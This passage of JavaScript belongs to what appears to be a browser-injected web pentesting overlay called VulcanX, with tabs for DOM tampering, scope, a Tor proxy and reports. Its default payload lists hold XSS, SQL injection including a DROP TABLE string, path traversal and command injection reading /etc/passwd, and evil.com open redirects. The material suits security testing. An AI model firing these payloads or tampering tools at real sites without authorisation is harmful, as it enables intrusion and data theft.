                        alert("DOM Tampering Active! " + modifiedCount + " elements modified (revealed hidden fields, removed disabled/readonly/maxlength attributes).");
                    } else {
                        alert("No restricted DOM elements found to tamper with.");
                    }
                };
                container.appendChild(tamperDOM);

                var clearAll = document.createElement('button');
                clearAll.innerText = 'Clear Forms';
                clearAll.style.width = '30%';
                clearAll.style.padding = '8px';
                clearAll.style.background = '#222';
                clearAll.style.color = '#fff';
                clearAll.style.border = '1px solid #444';
                clearAll.style.borderRadius = '4px';
                clearAll.style.cursor = 'pointer';
                clearAll.style.fontWeight = 'bold';
                clearAll.style.marginBottom = '12px';
                clearAll.onclick = function() {
                    inputs.forEach(input => {
                        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                        var nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
                        var setter = input.tagName === 'TEXTAREA' ? nativeTextAreaValueSetter : nativeInputValueSetter;
                        if (setter) { setter.call(input, ""); } else { input.value = ""; }
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                        input.dispatchEvent(new Event('change', { bubbles: true }));
                        input.style.border = '';
                    });
                };
                container.appendChild(clearAll);


                var table = document.createElement('table');
                table.className = 'vx-table';
                table.innerHTML = `<thead>
                                    <tr>
                                        <th>Source</th>
                                        <th>Key</th>
                                        <th>Value</th>
                                    </tr>
                                   </thead>`;
                var tbody = document.createElement('tbody');
                
                var sensitiveKeys = /token|session|secret|jwt|password|key|admin|auth|role/i;
                items.forEach(item => {
                    var tr = document.createElement('tr');
                    var isSensitive = sensitiveKeys.test(item.key) || sensitiveKeys.test(item.value);
                    if (isSensitive) {
                        tr.style.background = 'rgba(255, 0, 85, 0.15)';
                    }
                    tr.innerHTML = `<td style="color:#00ff55;font-weight:bold;">${item.source}</td>
                                    <td style="color:#ffcc00;font-weight:bold;">${item.key}</td>
                                    <td style="color:#aaa;word-break:break-all;">${item.value}</td>`;
                    tbody.appendChild(tr);
                });
                table.appendChild(tbody);
                container.appendChild(table);
} else if (tab === 'payloads') {

container.innerHTML = '';
                
                var pLabel = document.createElement('div');
                pLabel.innerText = 'Manage Fuzzer & Forms Payloads';
                pLabel.style.fontWeight = 'bold';
                pLabel.style.marginBottom = '10px';
                pLabel.style.color = '#ff0055';
                pLabel.style.textAlign = 'center';
                container.appendChild(pLabel);

                var catSelect = document.createElement('select');
                catSelect.style.width = '100%';
                catSelect.style.padding = '8px';
                catSelect.style.background = '#222';
                catSelect.style.color = '#fff';
                catSelect.style.border = '1px solid #444';
                catSelect.style.marginBottom = '10px';
                catSelect.style.borderRadius = '4px';
                
                var cats = Object.keys(window.__vulcanx_state.payloads || {});
                cats.forEach(function(cat) {
                    var opt = document.createElement('option');
                    opt.value = cat;
                    opt.innerText = cat.toUpperCase() + ' Payloads';
                    catSelect.appendChild(opt);
                });
                container.appendChild(catSelect);

                var pArea = document.createElement('textarea');
                pArea.style.width = '100%';
                pArea.style.height = '220px';
                pArea.style.background = '#111';
                pArea.style.color = '#00ff55';
                pArea.style.border = '1px solid #333';
                pArea.style.fontFamily = 'monospace';
                pArea.style.fontSize = '11px';
                pArea.style.padding = '8px';
                pArea.style.marginBottom = '10px';
                pArea.style.borderRadius = '4px';
                pArea.style.whiteSpace = 'pre';
                container.appendChild(pArea);

                var updateArea = function() {
                    var cat = catSelect.value;
                    if (window.__vulcanx_state.payloads[cat]) {
                        pArea.value = window.__vulcanx_state.payloads[cat].join('\n');
                    }
                };
                catSelect.onchange = updateArea;
                updateArea();

                var pBtnGroup = document.createElement('div');
                pBtnGroup.style.display = 'flex';
                pBtnGroup.style.gap = '10px';

                var saveBtn = document.createElement('button');
                saveBtn.innerText = 'Save Changes';
                saveBtn.style.flex = '1';
                saveBtn.style.padding = '10px';
                saveBtn.style.background = '#006644';
                saveBtn.style.color = '#fff';
                saveBtn.style.border = 'none';
                saveBtn.style.borderRadius = '4px';
                saveBtn.style.cursor = 'pointer';
                saveBtn.style.fontWeight = 'bold';
                saveBtn.onclick = function() {
                    var cat = catSelect.value;
                    var lines = pArea.value.split('\n').map(function(l) { return l.trim(); }).filter(function(l) { return l.length > 0; });
                    window.__vulcanx_state.payloads[cat] = lines;
                    var tst = document.createElement('div');
                    tst.className = 'vx-toast';
                    tst.style.position = 'fixed';
                    tst.style.bottom = '20px';
                    tst.style.right = '20px';
                    tst.style.background = 'rgba(0,102,68,0.9)';
                    tst.style.color = '#fff';
                    tst.style.padding = '10px 16px';
                    tst.style.borderRadius = '6px';
                    tst.style.zIndex = '999999';
                    tst.style.fontSize = '12px';
                    tst.innerText = cat.toUpperCase() + ' Payloads Saved! (' + lines.length + ' payloads)';
                    document.body.appendChild(tst);
                    setTimeout(function() { tst.style.opacity = '0'; setTimeout(function() { tst.remove(); }, 500); }, 3000);
                };
                pBtnGroup.appendChild(saveBtn);

                var resetBtn = document.createElement('button');
                resetBtn.innerText = 'Reset to Default';
                resetBtn.style.flex = '1';
                resetBtn.style.padding = '10px';
                resetBtn.style.background = '#440000';
                resetBtn.style.color = '#fff';
                resetBtn.style.border = 'none';
                resetBtn.style.borderRadius = '4px';
                resetBtn.style.cursor = 'pointer';
                resetBtn.style.fontWeight = 'bold';
                resetBtn.onclick = function() {
                    var defaults = {
                        xss: ['<script>alert(1)</script>', '"><script>alert(1)</script>', "'><img src=x onerror=alert(1)>", '<svg onload=alert(1)>', 'javascript:alert(1)', '<img src=x onerror=alert(document.cookie)>', '{{7*7}}', '${7*7}'],
                        sqli: ["'", '"', "' OR '1'='1", "' OR 1=1--", "' UNION SELECT null--", "admin'--", "1; DROP TABLE users--", "1' AND SLEEP(5)--"],
                        lfi: ['../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '....//....//etc/passwd', '%2e%2e%2fetc%2fpasswd'],
                        cmd: ['; id', '| id', '&& id', '`id`', '$(id)', '; cat /etc/passwd', '| whoami'],
                        open_redirect: ['//evil.com', 'https://evil.com', '//google.com/%2F..', 'javascript:alert(1)']
                    };
                    var cat = catSelect.value;
                    if (defaults[cat]) {
                        window.__vulcanx_state.payloads[cat] = defaults[cat];
                        pArea.value = defaults[cat].join('\n');
                    }
                };
                pBtnGroup.appendChild(resetBtn);
                container.appendChild(pBtnGroup);
} else if (tab === 'dom') {

container.innerHTML = '';

                var domTitle = document.createElement('div');
                domTitle.innerText = 'DOM Sink Monitor';
                domTitle.style.fontWeight = 'bold';
                domTitle.style.marginBottom = '10px';
                domTitle.style.color = '#ff0055';
                domTitle.style.textAlign = 'center';
                container.appendChild(domTitle);

                var domSinks = window.__vulcanx_state.domSinks || [];
                if (domSinks.length === 0) {
                    var noSinks = document.createElement('div');
                    noSinks.innerText = 'No DOM sinks triggered yet. Browse the app to collect data.';
                    noSinks.style.color = '#666';
                    noSinks.style.fontSize = '11px';
                    noSinks.style.textAlign = 'center';
                    noSinks.style.marginTop = '20px';
                    container.appendChild(noSinks);
                } else {
                    domSinks.forEach(function(sink) {
                        var sinkDiv = document.createElement('div');
                        sinkDiv.style.marginBottom = '8px';
                        sinkDiv.style.padding = '8px';
                        sinkDiv.style.background = '#1a0a0a';
                        sinkDiv.style.border = '1px solid #660000';
                        sinkDiv.style.borderRadius = '4px';
                        sinkDiv.style.fontFamily = 'monospace';
                        sinkDiv.style.fontSize = '10px';
                        sinkDiv.style.color = '#ff6666';
                        sinkDiv.style.wordBreak = 'break-all';
                        sinkDiv.innerText = '[' + (sink.sink||'unknown') + '] ' + (sink.value||'').slice(0, 200);
                        container.appendChild(sinkDiv);
                    });
                }

                var clearDomBtn = document.createElement('button');
                clearDomBtn.innerText = 'Clear';
                clearDomBtn.style.marginTop = '10px';
                clearDomBtn.style.width = '100%';
                clearDomBtn.style.padding = '8px';
                clearDomBtn.style.background = '#440000';
                clearDomBtn.style.color = '#fff';
                clearDomBtn.style.border = 'none';
                clearDomBtn.style.cursor = 'pointer';
                clearDomBtn.style.borderRadius = '4px';
                clearDomBtn.onclick = function() {
                    window.__vulcanx_state.domSinks = [];
                    window.__vulcanx_render();
                };
                container.appendChild(clearDomBtn);
} else if (tab === 'scope') {

container.innerHTML = '';

                var scopeTitle = document.createElement('div');
                scopeTitle.innerText = 'Scope Manager';
                scopeTitle.style.fontWeight = 'bold';
                scopeTitle.style.marginBottom = '10px';
                scopeTitle.style.color = '#ffcc00';
                scopeTitle.style.textAlign = 'center';
                container.appendChild(scopeTitle);

                var scopeInfo = document.createElement('div');
                scopeInfo.innerText = 'Add hostnames or URL patterns to restrict scanning scope. One entry per line.';
                scopeInfo.style.color = '#888';
                scopeInfo.style.fontSize = '10px';
                scopeInfo.style.marginBottom = '10px';
                container.appendChild(scopeInfo);

                var scopeArea = document.createElement('textarea');
                scopeArea.style.width = '100%';
                scopeArea.style.height = '200px';
                scopeArea.style.background = '#111';
                scopeArea.style.color = '#ffcc00';
                scopeArea.style.border = '1px solid #333';
                scopeArea.style.fontFamily = 'monospace';
                scopeArea.style.fontSize = '11px';
                scopeArea.style.padding = '8px';
                scopeArea.style.borderRadius = '4px';
                scopeArea.placeholder = 'example.com\napi.example.com\n*.example.com';
                scopeArea.value = (window.__vulcanx_state.scope || []).join('\n');
                container.appendChild(scopeArea);

                var scopeSaveBtn = document.createElement('button');
                scopeSaveBtn.innerText = 'Save Scope';
                scopeSaveBtn.style.marginTop = '10px';
                scopeSaveBtn.style.width = '100%';
                scopeSaveBtn.style.padding = '10px';
                scopeSaveBtn.style.background = '#004488';
                scopeSaveBtn.style.color = '#fff';
                scopeSaveBtn.style.border = 'none';
                scopeSaveBtn.style.cursor = 'pointer';
                scopeSaveBtn.style.borderRadius = '4px';
                scopeSaveBtn.style.fontWeight = 'bold';
                scopeSaveBtn.onclick = function() {
                    var lines = scopeArea.value.split('\n').map(function(l) { return l.trim(); }).filter(function(l) { return l.length > 0; });
                    window.__vulcanx_state.scope = lines;
                    var tst = document.createElement('div');
                    tst.style.position = 'fixed';
                    tst.style.bottom = '20px';
                    tst.style.right = '20px';
                    tst.style.background = 'rgba(0,68,136,0.9)';
                    tst.style.color = '#fff';
                    tst.style.padding = '10px 16px';
                    tst.style.borderRadius = '6px';
                    tst.style.zIndex = '999999';
                    tst.style.fontSize = '12px';
                    tst.innerText = 'Scope saved! (' + lines.length + ' entries)';
                    document.body.appendChild(tst);
                    setTimeout(function() { tst.style.opacity = '0'; setTimeout(function() { tst.remove(); }, 500); }, 3000);
                };
                container.appendChild(scopeSaveBtn);
} else if (tab === 'vpn') {

container.innerHTML = '';
                
                var title = document.createElement('h3');
                title.innerText = 'Tor Proxy Manager';
                title.style.color = '#ffcc00';
                title.style.borderBottom = '1px solid #333';
                title.style.paddingBottom = '8px';
                container.appendChild(title);
                
                var info = document.createElement('div');
                info.style.color = '#aaa';
                info.style.marginBottom = '15px';
                info.style.fontSize = '11px';
                info.innerText = 'Route all browser traffic through local Tor proxy to bypass blocks.';
                container.appendChild(info);
                
                var resultDiv = document.createElement('div');
                resultDiv.style.background = '#111';
                resultDiv.style.border = '1px solid #333';
                resultDiv.style.padding = '10px';
                resultDiv.style.fontFamily = 'monospace';
                resultDiv.style.whiteSpace = 'pre-wrap';
                resultDiv.style.display = 'none';
                
                resultDiv.style.display = 'block';
                resultDiv.style.marginTop = '10px';
                
                var torBtn = document.createElement('button');
                torBtn.innerText = 'Enable Tor Proxy (SOCKS5 127.0.0.1:9050)';
                torBtn.style.padding = '8px';
                torBtn.style.background = '#4CAF50';
                torBtn.style.color = '#fff';
                torBtn.style.border = 'none';
                torBtn.style.cursor = 'pointer';
                torBtn.style.borderRadius = '4px';
                torBtn.onclick = function() {
                    resultDiv.innerText = 'Routing traffic through Tor...';
                    fetch('/api/vpn', {
                        method: 'POST',
                        body: JSON.stringify({action: 'enable_tor'}),
                        headers: {'Content-Type': 'application/json'}
                    })
                    .then(r => r.json())
                    .then(data => {
                        if(data.status === 'ok') {
                            resultDiv.innerText = `Success!\n\nTor proxy enabled.`;
                        } else {
                            resultDiv.innerText = 'Error: ' + data.error;
                        }
                    }).catch(e => resultDiv.innerText = 'Error: ' + e);
                };
                
                var checkIpBtn = document.createElement('button');
                checkIpBtn.innerText = 'Check Current IP';
                checkIpBtn.style.padding = '8px';
                checkIpBtn.style.background = '#2196F3';
                checkIpBtn.style.color = '#fff';
                checkIpBtn.style.border = 'none';
                checkIpBtn.style.cursor = 'pointer';
                checkIpBtn.style.borderRadius = '4px';
                checkIpBtn.style.marginLeft = '10px';
                checkIpBtn.onclick = function() {
                    resultDiv.innerText = 'Checking IP address...';
                    fetch('/api/vpn', {
                        method: 'POST',
                        body: JSON.stringify({action: 'check_ip'}),
                        headers: {'Content-Type': 'application/json'}
                    })
                    .then(r => r.json())
                    .then(data => {
                        if(data.status === 'ok') {
                            resultDiv.innerText = `Current IP: ${data.ip}`;
                        } else {
                            resultDiv.innerText = 'Error: ' + data.error;
                        }
                    }).catch(e => resultDiv.innerText = 'Error: ' + e);
                };
                
                var disableTorBtn = document.createElement('button');
                disableTorBtn.innerText = 'Disable Tor Proxy';
                disableTorBtn.style.padding = '8px';
                disableTorBtn.style.marginTop = '10px';
                disableTorBtn.style.background = '#f44336';
                disableTorBtn.style.color = '#fff';
                disableTorBtn.style.border = 'none';
                disableTorBtn.style.cursor = 'pointer';
                disableTorBtn.style.borderRadius = '4px';
                disableTorBtn.style.marginLeft = '10px';
                disableTorBtn.onclick = function() {
                    resultDiv.innerText = 'Disabling Tor proxy...';
                    fetch('/api/vpn', {
                        method: 'POST',
                        body: JSON.stringify({action: 'disable_tor'}),
                        headers: {'Content-Type': 'application/json'}
                    })
                    .then(r => r.json())
                    .then(data => {
                        if(data.status === 'ok') {
                            resultDiv.innerText = `Success!\n\nTor proxy disabled.`;
                        } else {
                            resultDiv.innerText = 'Error: ' + data.error;
                        }
                    }).catch(e => resultDiv.innerText = 'Error: ' + e);
                };
                
                container.appendChild(torBtn);
                container.appendChild(disableTorBtn);
                container.appendChild(checkIpBtn);
                container.appendChild(resultDiv);
} else if (tab === 'report') {

container.innerHTML = '';

                var rptTitle = document.createElement('div');
                rptTitle.innerText = 'Engagement Report';
                rptTitle.style.fontWeight = 'bold';
                rptTitle.style.marginBottom = '10px';
                rptTitle.style.color = '#aa00ff';
                rptTitle.style.textAlign = 'center';
                container.appendChild(rptTitle);

                var findings = window.__vulcanx_state.findings || [];
                var counts = {CRITICAL:0, HIGH:0, MEDIUM:0, LOW:0, INFO:0};
                findings.forEach(function(f) { var sev = (f.severity||'INFO').toUpperCase(); if (counts[sev] !== undefined) counts[sev]++; });

                var statsDiv = document.createElement('div');
                statsDiv.style.display = 'flex';
                statsDiv.style.gap = '6px';
                statsDiv.style.marginBottom = '12px';
                statsDiv.style.flexWrap = 'wrap';
                var sevColors = {CRITICAL:'#ff0055', HIGH:'#ff6600', MEDIUM:'#ffcc00', LOW:'#00aaff', INFO:'#888'};
                Object.keys(counts).forEach(function(sev) {
                    var pill = document.createElement('div');
                    pill.style.flex = '1';
                    pill.style.textAlign = 'center';
                    pill.style.padding = '6px 4px';
                    pill.style.background = '#1a1a24';
                    pill.style.border = '1px solid ' + (sevColors[sev]||'#333');
                    pill.style.borderRadius = '4px';
                    pill.style.fontSize = '10px';
                    pill.style.color = sevColors[sev]||'#888';
                    pill.innerHTML = '<strong>' + counts[sev] + '</strong><br>' + sev;
                    statsDiv.appendChild(pill);
                });
                container.appendChild(statsDiv);

                var sortedFindings = findings.slice().sort(function(a,b) {
                    var order = {CRITICAL:0, HIGH:1, MEDIUM:2, LOW:3, INFO:4};
                    return (order[(a.severity||'INFO').toUpperCase()]||4) - (order[(b.severity||'INFO').toUpperCase()]||4);
                });
                var top5 = sortedFindings.slice(0, 5);
                if (top5.length === 0) {
                    var noFindingsDiv = document.createElement('div');
                    noFindingsDiv.innerText = 'No findings yet.';
                    noFindingsDiv.style.color = '#666';
                    noFindingsDiv.style.fontSize = '11px';
                    container.appendChild(noFindingsDiv);
                } else {
                    top5.forEach(function(f) {
                        var fItem = document.createElement('div');
                        fItem.style.marginBottom = '6px';
                        fItem.style.padding = '6px';
                        fItem.style.background = '#1a1a24';
                        fItem.style.borderLeft = '2px solid ' + (sevColors[(f.severity||'INFO').toUpperCase()] || '#888');
                        fItem.style.borderRadius = '0 4px 4px 0';
                        fItem.innerHTML = '<div style="font-weight:bold;color:' + (sevColors[(f.severity||'INFO').toUpperCase()]||'#888') + ';font-size:10px;">' + (f.severity||'INFO') + ' – ' + (f.type||'') + '</div><div style="color:#aaa;font-size:9px;word-break:break-all;">' + (f.url||'').slice(0,100) + '</div>';
                        container.appendChild(fItem);
                    });
                }

                var rptBtnRow = document.createElement('div');
                rptBtnRow.style.display = 'flex';
                rptBtnRow.style.gap = '6px';
                rptBtnRow.style.marginTop = '12px';
                rptBtnRow.style.flexWrap = 'wrap';

                var dlHtmlBtn = document.createElement('button');
                dlHtmlBtn.innerText = '\u2b07 HTML Report';
                dlHtmlBtn.style.flex = '1';
                dlHtmlBtn.style.background = '#004488';
                dlHtmlBtn.style.color = '#fff';
                dlHtmlBtn.style.border = '1px solid #0088ff';
                dlHtmlBtn.style.padding = '6px';
                dlHtmlBtn.style.borderRadius = '3px';
                dlHtmlBtn.style.cursor = 'pointer';
                dlHtmlBtn.style.fontSize = '10px';
                dlHtmlBtn.onclick = async function() {
                    try {
                        var resp = await fetch('/api/report');
                        if (resp.ok) {
                            var html = await resp.text();
                            var blob = new Blob([html], {type:'text/html'});
                            var a = document.createElement('a');
                            a.href = URL.createObjectURL(blob);
                            a.download = 'vulcanx_report.html';
                            a.click();
                        } else {
                            alert('Could not fetch /api/report');
                        }
                    } catch(e) {
                        alert('Error fetching report: ' + e.message);
                    }
                };
                rptBtnRow.appendChild(dlHtmlBtn);

                var dlJsonBtn = document.createElement('button');
                dlJsonBtn.innerText = '\u2b07 JSON';
                dlJsonBtn.style.flex = '1';
                dlJsonBtn.style.background = '#333';
                dlJsonBtn.style.color = '#fff';
                dlJsonBtn.style.border = '1px solid #555';
                dlJsonBtn.style.padding = '6px';
                dlJsonBtn.style.borderRadius = '3px';
                dlJsonBtn.style.cursor = 'pointer';
                dlJsonBtn.style.fontSize = '10px';
                dlJsonBtn.onclick = function() {
                    var data = {
                        findings: window.__vulcanx_state.findings,
                        traffic: window.__vulcanx_state.traffic,
                        domSinks: window.__vulcanx_state.domSinks,
                        scope: window.__vulcanx_state.scope,
                        generatedAt: new Date().toISOString()
                    };
                    var blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
                    var a = document.createElement('a');
                    a.href = URL.createObjectURL(blob);
                    a.download = 'vulcanx_report.json';
                    a.click();
                };
                rptBtnRow.appendChild(dlJsonBtn);

                var copySummaryBtn = document.createElement('button');
                copySummaryBtn.innerText = '\uD83D\uDCCB Copy Summary';
                copySummaryBtn.style.flex = '1';
                copySummaryBtn.style.background = '#440055';
                copySummaryBtn.style.color = '#fff';
                copySummaryBtn.style.border = '1px solid #aa00ff';
                copySummaryBtn.style.padding = '6px';
                copySummaryBtn.style.borderRadius = '3px';
                copySummaryBtn.style.cursor = 'pointer';
                copySummaryBtn.style.fontSize = '10px';
                copySummaryBtn.onclick = function() {
                    var lines = ['# VulcanX Engagement Summary', ''];
                    lines.push('**Generated:** ' + new Date().toISOString());
                    lines.push('**Target:** ' + window.location.hostname);
                    lines.push('');
                    lines.push('## Severity Breakdown');
                    Object.keys(counts).forEach(function(sev) {
                        lines.push('- **' + sev + ':** ' + (counts[sev]||0));
                    });
                    lines.push('');
                    lines.push('## Top Findings');
                    top5.forEach(function(f,i) {
                        lines.push((i+1) + '. [' + (f.severity||'INFO') + '] ' + (f.type||'') + ' \u2014 ' + (f.url||'').slice(0,80));
                    });
                    var notes = window.__vulcanx_state.engagementNotes || '';
                    if (notes.trim()) {
                        lines.push('');
                        lines.push('## Engagement Notes');
                        lines.push(notes);
                    }
                    navigator.clipboard.writeText(lines.join('\n')).then(function() {
                        copySummaryBtn.innerText = 'Copied!';
                        setTimeout(function() { copySummaryBtn.innerText = '\uD83D\uDCCB Copy Summary'; }, 2000);
                    });
                };
                rptBtnRow.appendChild(copySummaryBtn);
                container.appendChild(rptBtnRow);

                var notesLabel = document.createElement('div');
                notesLabel.innerText = 'Engagement Notes:';
                notesLabel.style.color = '#aaa';
                notesLabel.style.fontWeight = 'bold';
                notesLabel.style.fontSize = '11px';
                notesLabel.style.marginTop = '12px';
                notesLabel.style.marginBottom = '4px';
                container.appendChild(notesLabel);

                var notesArea = document.createElement('textarea');
                notesArea.style.width = '100%';
                notesArea.style.height = '80px';
                notesArea.style.background = '#111';
                notesArea.style.color = '#ccc';
                notesArea.style.border = '1px solid #333';
                notesArea.style.fontFamily = 'monospace';
                notesArea.style.fontSize = '11px';
                notesArea.style.padding = '6px';
                notesArea.style.borderRadius = '3px';
                notesArea.placeholder = 'Enter engagement notes, credentials found, key observations...';
                notesArea.value = window.__vulcanx_state.engagementNotes || '';
                notesArea.oninput = function() {
                    window.__vulcanx_state.engagementNotes = notesArea.value;
                };
                container.appendChild(notesArea);
}

        };

        window.__vulcanx_toggle_inputs = function() {
            var inputs = document.querySelectorAll('input:not([type="hidden"]), textarea');
            inputs.forEach(input => {
                if (window.__vulcanx_state.highlighting) {
                    input.setAttribute('data-vx-border', input.style.border || '');
                    input.style.border = '2px dashed #ff0055';
                    input.style.boxShadow = '0 0 10px rgba(255, 0, 85, 0.4)';
                } else {
                    var oldBorder = input.getAttribute('data-vx-border') || '';
                    input.style.border = oldBorder;
                    input.style.boxShadow = '';
                }
            });
        };
    } catch(e) {}
})();
